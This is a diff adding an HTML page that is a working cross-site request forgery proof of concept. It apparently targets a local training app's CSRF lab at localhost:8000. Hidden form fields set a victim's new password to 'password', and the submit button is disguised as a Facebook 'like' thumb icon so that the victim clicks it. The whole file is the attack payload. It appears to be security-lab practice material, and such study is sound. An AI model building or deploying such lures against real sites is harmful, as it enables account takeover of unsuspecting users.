@@ -1,0 +1,27 @@
+<html>
+<head>
+<style>
+    input[type="submit"]{
+        background-color: #fff;
+        background-image: url(https://en.facebookbrand.com/wp-content/themes/fb-branding/prj-fb-branding/assets/images/thumb-drawn.svg);
+        background-repeat: no-repeat;
+        background-size: contain;
+        width: 30px;
+        height: 30px;
+        border: 0;
+        cursor:pointer;
+    }
+    form {
+        padding: 100px;
+    }
+</style>
+</head>
+<body>
+<form action="http://localhost:8000/vulnerabilities/csrf" method="GET">
+    <input type="hidden" name="password_new" value="password"/>
+    <input type="hidden" name="password_conf" value="password"/>
+    <input type="hidden" name="Change" value="Change"/>
+    <input type="submit" name="submit" value=""/>
+</form>
+</body>
+</html>
